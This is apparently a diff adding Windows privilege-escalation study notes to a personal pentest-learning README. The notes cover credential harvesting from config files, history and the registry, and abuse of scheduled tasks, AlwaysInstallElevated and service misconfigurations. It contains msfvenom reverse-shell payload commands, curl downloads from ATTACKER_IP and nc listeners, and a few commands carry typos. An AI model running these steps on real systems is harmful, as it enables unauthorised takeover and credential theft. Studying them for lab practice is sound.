@@ -122,10 +122,15 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Privilege Escaltion: Kernel Exploits
 - Privilege Escalation: Sudo
 - Privilege Escaltion: SUID
-- Privilege Escalation:  Capabilities
+- Privilege Escalation: Capabilities
 - Privilege Escalation: Cron Jobs
 - Privilege Escalation: PATH
 - Privilege Escalation: NFS
+
+### Windows Privilege Escalation
+- Harvesting Password from usual spot
+- Other Quick Wins
+- Abusing Service Misconfigurations
 
   
 
@@ -1064,19 +1069,309 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 			uid=0(root) gid=0(root)
 
 	- It is important to notice that the executable file had SUID bit set, that is why the system runs with root privileges.
-    
  
-  			
+# Privilege Escalation: Windows
 
-	
+- Depending on the situation, we can abusy some of the weaknesses in the Windows to gain higher privilege of the system:
 
-	
+	- Misconfiguration on Windows Services or scheduled tasks
 
+	- Excessive Privilege to our account
 
+   	- Vulnerable software
+ 
+   	- Missing Windows Security patches
+ 
+- Windows system have mainly two types of user ( Administrators and Standard User). In addition to that there also usually exists an built-in accounts used by the operating system:
 
+  	- SYSTEM/LocalSystem : used by OS to perform internal tasks. has full access to all files available on the host with even higher privileges than the administrators.
+ 
+  	- Local Service: default account to run Windows services with "minimum" privilieges. uses anonymous connection over the internet.
+ 
+  	- Network Service: uses the computer credentials to authenticate through the network.
+ 
+  	  (These accounts are created and managed by Windows, but we may gain their privileges by exploiting specific services.
+ 
+ 
+ ## Harvesting Passwords from usual spot:
+
+ - One of the easiest way to gain access to another user is to gather credentials from a comprmised machine. This usually exists because of the carelessness of the user by leaving them in plaintext files or even stored by some software like browsers and email.
+
+  ### Unattended Windows Installations:
+
+   - When installing Windows on a large number of hosts, admins may use Windows Deployment Services. What it does is it allows a single OS image to be deployed to several hosts through the network. These types of installations are called unattended installations as they do not require user interaction. So, they are typically stored in:
+
+	 	- C:\Unattend.xml
+   	  
+   	  	- C:\Windows\Panther\Unattend.xml
+    
+      	- C:\Windows\system32\sysprep.inf
+    
+      	- C:\Windows\system32\sysprep\sysprep.xml
+    
+      	  	-> As part of these files, we mount find some credentials.
+
+### Powershell History:
+
+  - We could also check powershell history to see if a user have previosuly executed a command using Powershell to see past commands. If a user have previously run a command that includes a password, then we can retrieve it using the cmd.exe prompt:
+ 
+    	> type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+	-> We could only run this command in cmd.exe as Powershell do not recognize the "%userprofile%" as an environment variable. So, in Powershell we could write "$Env:userprofile".
+
+- Saved Windows Credentials:
+
+  - Windows also allows us to use other users credentials.
+ 
+    	> cmdkey /list
+
+	-> It does not show the actual password, but if a user is within this suppose 'nischal', we can easily extract the password using:
+
+		> runas /savecred /user:nischal cmd.exe
+
+ ### IIS Configuration:
+
+   - IIS stands for Internet Information Services which is the default web server on Windows installations. The configuration of websites on IIS is stored in "web.config" and it could store passwords for databases or other authentication mechanisms. Depending on the IIS version, we can locate this file in:
   
-			
+     	- C:\inetpub\wwwroot\webconfig
+    
+     	- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+    
+     - to find the database connection string we could run:
+    
+       		> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 
+ ### Retreive Credentials from Software:PuTTY
+
+ - PuTTY is an SSH client which is commonly found on Windows systems. The role of this software is to store sessions such as Ip, user and other configurations rather than specifying connection's parameter each time. It stores proxy configurations that include cleaertext authentication credentials. SSH password is however not allowed to be stpred in PuTTY.
+
+ - To retireve the stored proxy credentials, we can search under the registry key for ProxyPassword:
+
+   		> reg query HKEY_CURRENT_USER\Software|SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+   -> Here, Simon Tatham is the creator of PuTTY and that is the name of the path not the username for which we would be retrieving password for.
+
+## Other Qucik Wins:
+
+- Some misconfiguration can give us advantage to obtain higher privilege user access and in some cases even administrator access.
+
+  ### Scheduled Tasks:
+
+  - Accoring to my view, a scheduled task is quite similar to the cronjobs in linux OS, as we could see if the scheduled task has either lost its binary or the binary could be modified.
+ 
+  - It can be listed using:
+
+		> schtasks /query /tn vulntask /fo list /v
+
+	-> Looking at the information we will get here, we could easily identify the scheduled task by looking at the "Task to Run" parameter. Also, "Run As User" parameter could help us identify the user that will be used to execute the task. So, if our current user can modify this "Task to Run" executable, then we can control the script that will be executed by this user which results in a simple privilege escalation.
+
+	-> To check the file permission on the executable, we can use:
+
+		> icacls c:\tasks\schtask.bat
+
+	-> If the BUILTIN\Users group has full access (F) over this tasks binary, then we can modify the .bat file and insert any payload we want. After creating a payload we coud just do:
+
+		> echo c:\path\to\payload.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+
+	-> We listen on our attacking machine
+
+		> nc-lvnp 4444
+
+	-> So the next time the scheduled task runs, we will recieve the reverse shell with the user privilege that was supposed to run this task.
+
+### AlwaysInstallElevated:
+
+- Windows installer files (.msi files) are used to install applications on the system. They run with the privilege level of the user that starts it. However, these files could be run with higher privileges from even lower privileged ones. We can generate a mallicious MSI files that would run with admin priviliges.
+
+- So the method requires us to set two registry values. It can be queried from the command line:
+
+  		> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+  		> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+  - Both should be set to exploit this vulnerability. Then, we can generate a malicious .msi file using msfvenom:
+ 
+    	> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+	-> We shoudl also run the Metasploit handler module by configuring it correctly and transfer this file to the Windows by hosting a python server then downloading it on windows system.
+
+	-> to exploit it, we would run:
+
+		> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+## Abusing Service Misconfigurations
+
+### Windows Services:
+
+- Service Control Manager(SCM) manages Windows services. Each service on a Windows machine will have an associayed executable that will be run by the SCM whenever a service is started.
+
+- Structure of a service:
+
+  		> sc qc apphostsvc (checking the strucure of this service)
+
+  		SERVICE NAME : apphostsvc
+
+			TYPE:
+
+  			START_TYPE:
+
+			ERROR_CONTROL:
+
+  			BINARY_PATH_NAME:
+
+  			LOAD_ORDER_GROUP:
+
+  			TAG:
+
+  			DISPLAY NAME:
+
+  			DEPENDENCIES:
+
+  			SERVICE_START_NAME:
+
+  			{It is important to note to always check for binary path name and service start name to find any exploits realted to the service}
+
+  - Services have Discretionary Access Control list (DACL) that indicates who has permission to start, stop, pause, query status. query configuration, or reconfigure the service among other privileges. If a DACL is configured for the service, it will be stored in a subkey called Security and only administrators can modify such registry entries by default.
+ 
+  ## Insecure Permissions on Service Executable:
+
+  - If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, then the attacker can gain the privileges of the service's account.
+ 
+    	> sc qc SERVICENAME
+
+	-> As I have mentioned above the key parameters to check for is the binary path name and service start name. If the service runs as a normal user other than the one we are logged in as, then it can be interesting to check the binary path permissions.
+
+		> icacls BINARY_PATH_NAME
+
+	-> If we can spot anything like "Everyone:(I)(M), then it can be confirmed that the service is modifiable, and our current user can e. So, we can easily overwrite it with any payload of our preference, and the service will execute it with the privilege of the configured user account.
+
+	-> First, we need to generate a paylaod:
+
+		$ msfvenom -p windows/x64/shell_reverse_shell_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o svc.exe
+
+	-> Then serve a server so that the windows unprivileged user can pull this file.
+
+		$ python3 -m http.server
+
+	-> Pull the payload from the command line.
+
+		> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe
+
+	-> Once the payload is in the Windows server, we need to replace the existing vulnerable service executable with this payload.
+
+		> cd PATH\TO\VULNERABLE_SERVICE
+
+		> move VulnerableService.exe VulnerableService.exe.bkp
+
+	-> Then, we move our payload to this binary path where the service is executed
+
+		> move PATH\OF\LOWERPRIVUSER\svc.exe VulnerableService.exe
+
+	-> As, we need to execute our payload from another user, we will give full permission to the Everyone group as well.
+
+		>icacls VulnerableService.exe /grant Everyone:F
+
+	-> Then, we have to wait for the service to be restarted adn have a listener ready on the attack machine.
+
+		$ nc -lvnp 4444
+
+	-> After this vulnerable service gets restarted, we will get a shell of the privileged configured user account on the attack machine.
+
+## Unquoted Service Paths:
+
+- In case we cannot directly write into service executables like shown above, there still might be a chance to force a service into running arbitrary executables.
+
+- When working with Windows services, a specific behaviour occurs when the service is configured to point to an "unquoted executable". This means the path of the associated executable is not properly quoted to account for spaces on the command.
+
+- We could search if this vulnerability exist by:
+
+  		> sc qc "SERVICENAME"
+
+  - We already know the structure these queires throw out so, here we adde the "" quote to the service name , so the paramter "BINARY_PATH_NAME" should show "PATH\TO\THE\SERVICE.exe". If the binary path does not has the "" quote, then, this means we can exploit this unquoted service path.
+ 
+  - This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument seperators unless they are part of the quoted string. So, suppose if a service has binary path C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe without the quote, then, the SCM tries:
+ 
+   		 -> First searches C:\\MyPrograms\\Disk.exe, if it runs the service will run this executable
+
+		-> If it does not exist, it will search C:\\MyPrograms\\DiskSorter.exe.
+
+		-> If that also does not exist, then it will search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe.
+
+	- So, the problem with this is if an attacker creates any of the executables that are searched for before the expected service executable, then they can force the service to run an arbitrary executable.
+ 
+  - Most of service executables is installed under C:\Program Files or C:\Program Files (x86) by default, that cannot be writable by unprivileged users. But, some installers change the permissions on the installed folder making these services vulnerable. Even some adminsitrator might decide to install the service binaries in a non-default path. So, if such path is world-writable, the vulnerability can be exploited.
+ 
+  - Assuming the example provided above of the binary path, We can check this using :
+ 
+    	> icacls c:\MyPrograms
+
+	-> We could look for BUILTIN\USERS group, where the permissions are written for all users of the Windows system. If we can see (AD) and (WD) privileges, this means the user can create subdirectories and files in this location. So, an attacker can create an exe-service payload in this path so that the SCM tries the attackers payload executable before teaching the real service executable. The above method could be used to generate and serve the payload in the windows server.
+
+		$ msfvenom -l <Payload> <Options>
+
+		$ python -m http.server
+
+		On windows:
+
+		> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe
+
+	-> Then, we can move this executable to the path of the binary which the SCM will reach first than the actual one.
+
+		> move C:\Users\target\svc.exe C:\MyPrograms\Disk.exe
+
+	-> Grant Everyone full permission so it can be executed by service
+
+		> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+
+	 -> Then, we can restart the service or wait for it to be restarted.
+ 
+  		In Attacking Machine:
+ 
+    	$ nc -lvnp 4444 (should be the port that is configured in the payload)
+ 
+    	In Windows:
+
+		> sc stop "disk sorter enterprise"
+
+		> sc start "disk sorter enterprise"
+
+	- As a result, we will get a reverse shell on the attacking machine of the privileged configured user that could give attacker more freedom inside the system
+ 
+ ## Insecure Service Permissions:
+
+ - We still have a slight chance of taking advantage of a service if the service's executable DACL is well configured and the service binary path is rightly quoted. We can check if the service DACL can allow us to modify the configuration of a service (not the service's executable DACL), then we could reconfigure the service. What this does is, it allows us to point to any executable we needs and run it with any account, including SYSTEM itself.
+ - To cehck for a service DACL, we could use Accesschk from the Sysinternals suite.
+
+   		> accesschk.exe -qlc SERVICE_NAME
+
+   - If we can find any service that gives the BUILTIN\USERS access of SERVICE_ALL_ACCESS, this means any user can reconfigure the service.
+  
+   - Assuming we found a service with this permission for the built in user, we could build exe-service reverse shell payload using msfvenom.
+  
+     		$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATACKER_IP LPORT=4444 -f exe-service -o svc.exe
+
+	 - Now, the same method we used before, we will transfer this executable to the windows machine which we would have gained access to (low level user). Then, the same way we could grant permission for this executable to Everyone so the payload can be executed from anywhere.
+  
+   - Now, the main part is, to chance the service's associated executable and account, we can use:
+  
+     		> sc config SERVICE_NAME binPath="C:\PATH\TO\PAYLOAD\svc.exe" obj= LocalSystem
+
+	 -> As we could use any account to run the service, here we chose LocalSystem because it is the highest privilege account available. Now to trigger our payload we need to restart the service, but before we should have a listener ready to gain a reverse shell on the attacking machine.
+
+	 		On Attacking Machine
+
+			$ nc -lvnp 4444
+
+			On Windows Machine
+
+			> sc stop SERICE_NAME
+
+	 		> sc start SERVICE_NAME
+
+	 -> When we will look at our machine we will be at the highest privilege account of the Windows machine.
+		
+    
+    
 
 # REFERENCES
 
